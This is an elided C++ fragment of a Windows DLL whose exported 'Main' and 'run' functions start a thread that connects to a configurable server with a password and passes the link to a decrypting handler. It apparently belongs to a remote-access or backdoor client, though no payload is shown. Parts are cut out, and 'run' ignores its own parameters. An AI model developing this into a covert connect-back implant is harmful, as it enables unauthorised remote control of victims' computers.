...
DWORD WINAPI MainThread(LPVOID dllMainThread)
{
	...
	if (socketClient->Connect(MyInfo.szAddress, MyInfo.szPort, MyInfo.password))
	{
		CDecryptManger	manager(socketClient);
...
extern "C" __declspec(dllexport) bool Main(TCHAR * ip, DWORD port, BOOL IsTcp, TCHAR * passwoed, BOOL RunDllEntryProc)
{
	...
	MyInfo.szPort = port;
	_tcscpy_s(MyInfo.password, passwoed);
	MyInfo.IsTcp = IsTcp;
	MyInfo.RunDllEntryProc = RunDllEntryProc;
	hThread = CreateThread(0, 0, MainThread, 0, 0, 0);	//启动线程
	WaitForSingleObject(hThread, INFINITE);
	Sleep(300);
	return 0;
}

extern "C" __declspec(dllexport) bool run(TCHAR * ip, DWORD port, BOOL IsTcp, TCHAR * passwoed)
{
	HANDLE hThread = CreateThread(0, 0, MainThread, 0, 0, 0);	//启动线程
	WaitForSingleObject(hThread, INFINITE);
	Sleep(300);
	return 0;
}
